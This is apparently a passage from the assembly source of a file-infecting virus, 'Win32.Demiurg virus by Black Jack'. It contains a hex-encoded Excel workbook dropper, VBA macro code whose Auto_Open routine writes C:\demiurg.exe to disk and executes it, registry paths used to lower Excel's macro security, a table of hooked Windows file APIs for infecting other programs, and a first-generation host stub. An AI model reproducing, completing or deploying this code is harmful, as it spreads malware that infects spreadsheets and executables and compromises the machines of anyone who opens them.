	db 070h, 065h, 000h, 044h, 000h, 069h, 000h, 065h
	db 000h, 073h, 000h, 065h, 000h, 041h, 000h, 072h
	db 000h, 062h, 000h, 065h, 000h, 069h, 000h, 074h
	db 000h, 073h, 000h, 06Dh, 000h, 061h, 000h, 070h
	db 000h, 070h, 000h, 065h, 000h, 000h, 000h, 054h
	db 061h, 062h, 065h, 06Ch, 06Ch, 065h, 031h, 000h
	db 054h, 000h, 061h, 000h, 062h, 000h, 065h, 000h
	db 06Ch, 000h, 06Ch, 000h, 065h, 000h, 031h, 000h
	db 000h, 000h, 044h, 065h, 06Dh, 069h, 075h, 072h
	db 067h, 000h, 044h, 000h, 065h, 000h, 06Dh, 000h
	db 069h, 000h, 075h, 000h, 072h, 000h, 067h, 0E6h
	db 01Ah, 000h, 049h, 044h, 03Dh, 022h, 07Bh, 044h
	db 039h, 045h, 034h, 036h, 045h, 046h, 030h, 02Dh
	db 046h, 031h, 033h, 041h, 02Dh, 031h, 031h, 044h
	db 033h, 02Dh, 041h, 035h, 030h, 031h, 02Dh, 041h
	db 036h, 046h, 033h, 044h, 044h, 041h, 044h, 038h
	db 032h, 033h, 039h, 07Dh, 022h, 00Dh, 00Ah, 044h
	db 06Fh, 063h, 075h, 06Dh, 065h, 06Eh, 074h, 03Dh
	db 044h, 069h, 065h, 073h, 065h, 041h, 072h, 062h
	db 065h, 069h, 074h, 073h, 06Dh, 061h, 070h, 070h
	db 065h, 02Fh, 026h, 048h, 0E6h, 008h, 030h, 00Dh
	db 00Ah, 044h, 06Fh, 063h, 075h, 06Dh, 065h, 06Eh
	db 074h, 03Dh, 054h, 061h, 062h, 065h, 06Ch, 06Ch
	db 065h, 031h, 02Fh, 026h, 048h, 0E6h, 008h, 030h
	db 00Dh, 00Ah, 04Dh, 06Fh, 064h, 075h, 06Ch, 065h
	db 03Dh, 044h, 065h, 06Dh, 069h, 075h, 072h, 067h
	db 00Dh, 00Ah, 04Eh, 061h, 06Dh, 065h, 03Dh, 022h
	db 056h, 042h, 041h, 050h, 072h, 06Fh, 06Ah, 065h
	db 063h, 074h, 022h, 00Dh, 00Ah, 048h, 065h, 06Ch
	db 070h, 043h, 06Fh, 06Eh, 074h, 065h, 078h, 074h
	db 049h, 044h, 03Dh, 022h, 030h, 022h, 00Dh, 00Ah
	db 043h, 04Dh, 047h, 03Dh, 022h, 039h, 039h, 039h
	db 042h, 039h, 038h, 039h, 038h, 039h, 043h, 039h
	db 038h, 039h, 043h, 039h, 038h, 039h, 043h, 039h
	db 038h, 039h, 043h, 022h, 00Dh, 00Ah, 044h, 050h
	db 042h, 03Dh, 022h, 033h, 032h, 033h, 030h, 033h
	db 033h, 041h, 038h, 043h, 044h, 041h, 039h, 043h
	db 044h, 041h, 039h, 043h, 044h, 022h, 00Dh, 00Ah
	db 047h, 043h, 03Dh, 022h, 043h, 042h, 043h, 039h
	db 043h, 041h, 035h, 033h, 036h, 032h, 035h, 034h
	db 036h, 032h, 035h, 034h, 039h, 044h, 022h, 00Dh
	db 00Ah, 00Dh, 00Ah, 05Bh, 048h, 06Fh, 073h, 074h
	db 020h, 045h, 078h, 074h, 065h, 06Eh, 064h, 065h
	db 072h, 020h, 049h, 06Eh, 066h, 06Fh, 05Dh, 00Dh
	db 00Ah, 026h, 048h, 0E6h, 007h, 030h, 031h, 03Dh
	db 07Bh, 033h, 038h, 033h, 032h, 044h, 036h, 034h
	db 030h, 02Dh, 043h, 046h, 039h, 030h, 02Dh, 031h
	db 031h, 043h, 046h, 02Dh, 038h, 045h, 034h, 033h
	db 02Dh, 030h, 030h, 041h, 030h, 043h, 039h, 031h
	db 031h, 030h, 030h, 035h, 041h, 07Dh, 03Bh, 056h
	db 042h, 045h, 03Bh, 026h, 048h, 0E6h, 008h, 030h
	db 00Dh, 00Ah, 00Dh, 00Ah, 05Bh, 057h, 06Fh, 072h
	db 06Bh, 073h, 070h, 061h, 063h, 065h, 05Dh, 00Dh
	db 00Ah, 044h, 069h, 065h, 073h, 065h, 041h, 072h
	db 062h, 065h, 069h, 074h, 073h, 06Dh, 061h, 070h
	db 070h, 065h, 03Dh, 030h, 02Ch, 020h, 030h, 02Ch
	db 020h, 030h, 02Ch, 020h, 030h, 02Ch, 020h, 043h
	db 00Dh, 00Ah, 054h, 061h, 062h, 065h, 06Ch, 06Ch
	db 065h, 031h, 03Dh, 030h, 02Ch, 020h, 030h, 02Ch
	db 020h, 030h, 02Ch, 020h, 030h, 02Ch, 020h, 043h
	db 00Dh, 00Ah, 044h, 065h, 06Dh, 069h, 075h, 072h
	db 067h, 03Dh, 032h, 032h, 02Ch, 020h, 032h, 032h
	db 02Ch, 020h, 034h, 030h, 036h, 02Ch, 020h, 031h
	db 039h, 031h, 02Ch, 020h, 05Ah, 00Dh, 00Ah, 0E6h
	db 008h, 000h, 0FEh, 0FFh, 000h, 000h, 004h, 000h
	db 002h, 0E6h, 011h, 000h, 001h, 000h, 000h, 000h
	db 0E0h, 085h, 09Fh, 0F2h, 0F9h, 04Fh, 068h, 010h
	db 0ABh, 091h, 008h, 000h, 02Bh, 027h, 0B3h, 0D9h
	db 030h, 000h, 000h, 000h, 084h, 000h, 000h, 000h
	db 006h, 000h, 000h, 000h, 001h, 000h, 000h, 000h
	db 038h, 000h, 000h, 000h, 004h, 000h, 000h, 000h
	db 040h, 000h, 000h, 000h, 008h, 000h, 000h, 000h
	db 04Ch, 000h, 000h, 000h, 012h, 000h, 000h, 000h
	db 058h, 000h, 000h, 000h, 00Ch, 000h, 000h, 000h
	db 070h, 000h, 000h, 000h, 013h, 000h, 000h, 000h
	db 07Ch, 000h, 000h, 000h, 002h, 000h, 000h, 000h
	db 0E4h, 004h, 000h, 000h, 01Eh, 000h, 000h, 000h
	db 002h, 000h, 000h, 000h, 042h, 000h, 073h, 000h
	db 01Eh, 000h, 000h, 000h, 002h, 000h, 000h, 000h
	db 042h, 000h, 073h, 000h, 01Eh, 000h, 000h, 000h
	db 010h, 000h, 000h, 000h, 04Dh, 069h, 063h, 072h
	db 06Fh, 073h, 06Fh, 066h, 074h, 020h, 045h, 078h
	db 063h, 065h, 06Ch, 000h, 040h, 000h, 000h, 000h
	db 080h, 0ECh, 0E8h, 033h, 03Fh, 085h, 0BFh, 001h
	db 003h, 0E6h, 013h, 000h, 0FEh, 0FFh, 000h, 000h
	db 004h, 000h, 002h, 0E6h, 011h, 000h, 002h, 000h
	db 000h, 000h, 002h, 0D5h, 0CDh, 0D5h, 09Ch, 02Eh
	db 01Bh, 010h, 093h, 097h, 008h, 000h, 02Bh, 02Ch
	db 0F9h, 0AEh, 044h, 000h, 000h, 000h, 005h, 0D5h
	db 0CDh, 0D5h, 09Ch, 02Eh, 01Bh, 010h, 093h, 097h
	db 008h, 000h, 02Bh, 02Ch, 0F9h, 0AEh, 008h, 001h
	db 000h, 000h, 0C4h, 000h, 000h, 000h, 009h, 000h
	db 000h, 000h, 001h, 000h, 000h, 000h, 050h, 000h
	db 000h, 000h, 00Fh, 000h, 000h, 000h, 058h, 000h
	db 000h, 000h, 017h, 000h, 000h, 000h, 064h, 000h
	db 000h, 000h, 00Bh, 000h, 000h, 000h, 06Ch, 000h
	db 000h, 000h, 010h, 000h, 000h, 000h, 074h, 000h
	db 000h, 000h, 013h, 000h, 000h, 000h, 07Ch, 000h
	db 000h, 000h, 016h, 000h, 000h, 000h, 084h, 000h
	db 000h, 000h, 00Dh, 000h, 000h, 000h, 08Ch, 000h
	db 000h, 000h, 00Ch, 000h, 000h, 000h, 0A1h, 000h
	db 000h, 000h, 002h, 000h, 000h, 000h, 0E4h, 004h
	db 000h, 000h, 01Eh, 000h, 000h, 000h, 001h, 0E6h
	db 005h, 000h, 06Ch, 000h, 003h, 000h, 000h, 000h
	db 06Ah, 010h, 008h, 000h, 00Bh, 0E6h, 007h, 000h
	db 00Bh, 0E6h, 007h, 000h, 00Bh, 0E6h, 007h, 000h
	db 00Bh, 0E6h, 007h, 000h, 01Eh, 010h, 000h, 000h
	db 001h, 000h, 000h, 000h, 009h, 000h, 000h, 000h
	db 054h, 061h, 062h, 065h, 06Ch, 06Ch, 065h, 031h
	db 000h, 00Ch, 010h, 000h, 000h, 002h, 000h, 000h
	db 000h, 01Eh, 000h, 000h, 000h, 009h, 000h, 000h
	db 000h, 054h, 061h, 062h, 065h, 06Ch, 06Ch, 065h
	db 06Eh, 000h, 003h, 000h, 000h, 000h, 001h, 0E6h
	db 005h, 000h, 098h, 000h, 000h, 000h, 003h, 0E6h
	db 007h, 000h, 020h, 000h, 000h, 000h, 001h, 000h
	db 000h, 000h, 036h, 000h, 000h, 000h, 002h, 000h
	db 000h, 000h, 03Eh, 000h, 000h, 000h, 001h, 000h
	db 000h, 000h, 002h, 000h, 000h, 000h, 00Ah, 000h
	db 000h, 000h, 05Fh, 050h, 049h, 044h, 05Fh, 047h
	db 055h, 049h, 044h, 000h, 002h, 000h, 000h, 000h
	db 0E4h, 004h, 000h, 000h, 041h, 000h, 000h, 000h
	db 04Eh, 000h, 000h, 000h, 07Bh, 000h, 044h, 000h
	db 039h, 000h, 045h, 000h, 034h, 000h, 036h, 000h
	db 045h, 000h, 046h, 000h, 031h, 000h, 02Dh, 000h
	db 046h, 000h, 031h, 000h, 033h, 000h, 041h, 000h
	db 02Dh, 000h, 031h, 000h, 031h, 000h, 044h, 000h
	db 033h, 000h, 02Dh, 000h, 041h, 000h, 035h, 000h
	db 030h, 000h, 031h, 000h, 02Dh, 000h, 041h, 000h
	db 036h, 000h, 046h, 000h, 033h, 000h, 044h, 000h
	db 044h, 000h, 041h, 000h, 044h, 000h, 038h, 000h
	db 032h, 000h, 033h, 000h, 039h, 000h, 07Dh, 0E6h
	db 027h, 000h, 005h, 000h, 044h, 000h, 06Fh, 000h
	db 063h, 000h, 075h, 000h, 06Dh, 000h, 065h, 000h
	db 06Eh, 000h, 074h, 000h, 053h, 000h, 075h, 000h
	db 06Dh, 000h, 06Dh, 000h, 061h, 000h, 072h, 000h
	db 079h, 000h, 049h, 000h, 06Eh, 000h, 066h, 000h
	db 06Fh, 000h, 072h, 000h, 06Dh, 000h, 061h, 000h
	db 074h, 000h, 069h, 000h, 06Fh, 000h, 06Eh, 0E6h
	db 00Bh, 000h, 038h, 000h, 002h, 000h, 0E6h, 00Ch
	db 0FFh, 0E6h, 024h, 000h, 0B1h, 000h, 000h, 000h
	db 0A0h, 001h, 0E6h, 006h, 000h, 001h, 000h, 043h
	db 000h, 06Fh, 000h, 06Dh, 000h, 070h, 000h, 04Fh
	db 000h, 062h, 000h, 06Ah, 0E6h, 031h, 000h, 012h
	db 000h, 002h, 000h, 0E6h, 00Ch, 0FFh, 0E6h, 024h
	db 000h, 0B8h, 000h, 000h, 000h, 068h, 0E6h, 04Bh
	db 000h, 0E6h, 00Ch, 0FFh, 0E6h, 074h, 000h, 0E6h
	db 00Ch, 0FFh, 0E6h, 030h, 000h, 001h, 000h, 0FEh
	db 0FFh, 003h, 00Ah, 000h, 000h, 0E6h, 004h, 0FFh
	db 020h, 008h, 002h, 0E6h, 005h, 000h, 0C0h, 0E6h
	db 006h, 000h, 046h, 01Ch, 000h, 000h, 000h, 04Dh
	db 069h, 063h, 072h, 06Fh, 073h, 06Fh, 066h, 074h
	db 020h, 045h, 078h, 063h, 065h, 06Ch, 020h, 038h
	db 02Eh, 030h, 02Dh, 054h, 061h, 062h, 065h, 06Ch
	db 06Ch, 065h, 000h, 006h, 000h, 000h, 000h, 042h
	db 069h, 066h, 066h, 038h, 000h, 00Eh, 000h, 000h
	db 000h, 045h, 078h, 063h, 065h, 06Ch, 02Eh, 053h
	db 068h, 065h, 065h, 074h, 02Eh, 038h, 000h, 0F4h
	db 039h, 0B2h, 071h, 0E6h, 0FFh, 000h, 0E6h, 0A5h
	db 000h
macro_dropper_size      EQU ($ - macro_dropper)

; ----- macro code ----------------------------------------------------------
;
; This is the macro code that will be stored in infected .xls files. It drops
; the PE EXE dropper as C:\demiurg.exe and executes it. This code is
; incomplete, the data of the dropper will be converted to VBA Array
; instructions at the time Excel is infected, and the full VBA code will be
; stored in the file C:\demiurg.sys then; this is the file that will be used
; to infect .xls files by the dropper

main_macro_code:
db "Attribute VB_Name = ""Demiurg""", 0Dh, 0Ah
db "Public a", 0Dh, 0Ah
db "Sub Auto_Open()", 0Dh, 0Ah
db "Open ""C:\demiurg.exe"" For Binary As #1", 0Dh, 0Ah
db "b", 0Dh, 0Ah
db "c", 0Dh, 0Ah
db "d", 0Dh, 0Ah
db "e", 0Dh, 0Ah
db "f", 0Dh, 0Ah
db "g", 0Dh, 0Ah
db "Close #1", 0Dh, 0Ah
db "t=Shell(""C:\demiurg.exe"",vbNormalFocus)", 0Dh, 0Ah
db "End Sub", 0Dh, 0Ah
db "Sub w()", 0Dh, 0Ah
db "For i=0 To 127", 0Dh, 0Ah
db "v$=Chr$(a(i))", 0Dh, 0Ah
db "Put #1,,v$", 0Dh, 0Ah
db "Next", 0Dh, 0Ah
end_sub:
db "End Sub", 0Dh, 0Ah
main_macro_code_size EQU ($ - main_macro_code)

sub_header:
sub_name EQU byte ptr ($ + 4)
db "Sub b()", 0Dh, 0Ah

regkey                  db "Software\Microsoft\Office\8.0\Excel", 0
office_version_number   EQU byte ptr (offset regkey+26)
subkey_97               db "Microsoft Excel", 0
subkey_2K               db "Security", 0
subkey_InstallRoot      db "InstallRoot", 0
regvalue_options        db "Options6", 0
regvalue_2K             db "Level", 0
regvalue_path           db "Path", 0

demiurg_xls             db "\xlstart\demiurg.xls", 0
macro_filename          db "C:\demiurg.sys", 0
kernel32_dll            db "\kernel32.dll", 0

path_buffer1            db 260 dup(?)
path_buffer2            db 260 dup(?)
size_buffer             dd 260
REG_SZ                  dd 1
regvalue_dword          dd 0
reg_handle1             dd ?
reg_handle2             dd ?

dos_exe_size            dd ?
resource_table          dd ?
heap_buffer             dd ?
dummy_dword             dd ?

filename_ofs            dd ?
attributes              dd ?
CreationTime            dq ?
LastAccessTime          dq ?
LastWriteTime           dq ?
filesize                dd ?
filehandle              dd ?
maphandle               dd ?
mapbase                 dd ?
virus_RVA               dd ?
virus_start             dd ?

kernel32                dd 0
kernel32name            db "KERNEL32", 0
GetModuleHandleA        db "GetModuleHandleA", 0
l_GMH                   EQU $ - offset GetModuleHandleA

kernel32_API_names_table:
n_GlobalAlloc           db "GlobalAlloc", 0
n_GlobalFree            db "GlobalFree", 0
n_GetWindowsDirectoryA  db "GetWindowsDirectoryA", 0
n_GetSystemDirectoryA   db "GetSystemDirectoryA", 0
n_lstrcatA              db "lstrcatA", 0
n_LoadLibraryA          db "LoadLibraryA", 0
n_CloseHandle           db "CloseHandle", 0
n_GetFileSize           db "GetFileSize", 0
n_GetFileTime           db "GetFileTime", 0
n_SetFileTime           db "SetFileTime", 0
n_SetEndOfFile          db "SetEndOfFile", 0
n_SetFilePointer        db "SetFilePointer", 0
n_CreateFileMappingA    db "CreateFileMappingA", 0
n_MapViewOfFile         db "MapViewOfFile", 0
n_UnmapViewOfFile       db "UnmapViewOfFile", 0
n_WideCharToMultiByte   db "WideCharToMultiByte", 0

; names of APIs that are both used and hooked
hooked_API_names_table:
n_CreateFileA           db "CreateFileA", 0
n_GetFileAttributesA    db "GetFileAttributesA", 0
n_SetFileAttributesA    db "SetFileAttributesA", 0
n_CopyFileA             db "CopyFileA", 0
n_MoveFileExA           db "MoveFileExA", 0

; names of APIs that are only hooked and not used
n_MoveFileA             db "MoveFileA", 0
n__lopen                db "_lopen", 0

number_of_hooked_APIs   EQU 7

kernel32_API_address_table:
GlobalAlloc             dd ?
GlobalFree              dd ?
GetWindowsDirectoryA    dd ?
GetSystemDirectoryA     dd ?
lstrcatA                dd ?
LoadLibraryA            dd ?
CloseHandle             dd ?
GetFileSize             dd ?
GetFileTime             dd ?
SetFileTime             dd ?
SetEndOfFile            dd ?
SetFilePointer          dd ?
CreateFileMappingA      dd ?
MapViewOfFile           dd ?
UnmapViewOfFile         dd ?
WideCharToMultiByte     dd ?
CreateFileA             dd ?
GetFileAttributesA      dd ?
SetFileAttributesA      dd ?
CopyFileA               dd ?
MoveFileExA             dd ?
number_of_kernel32_APIs EQU (($ - kernel32_API_address_table) / 4)

advapi32_dll            db "ADVAPI32.dll", 0
advapi32_API_names_table:
n_RegOpenKeyExA         db "RegOpenKeyExA", 0
n_RegCreateKeyExA       db "RegCreateKeyExA", 0
n_RegQueryValueExA      db "RegQueryValueExA", 0
n_RegSetValueExA        db "RegSetValueExA", 0
n_RegCloseKey           db "RegCloseKey", 0

advapi32_API_address_table:
RegOpenKeyExA           dd ?
RegCreateKeyExA         dd ?
RegQueryValueExA        dd ?
RegSetValueExA          dd ?
RegCloseKey             dd ?
number_of_advapi32_APIs EQU (($ - advapi32_API_address_table) / 4)

imagehlp_dll            db "IMAGEHLP.dll", 0
CheckSumMappedFile      db "CheckSumMappedFile", 0

virus_end:


.code
dummy_host:
        push 0
        push offset caption
        push offset message
        push 0
	call MessageBoxA

	push 0
	call ExitProcess

caption db "Win32.Demiurg virus by Black Jack", 0
message db "First generation host", 0

end start
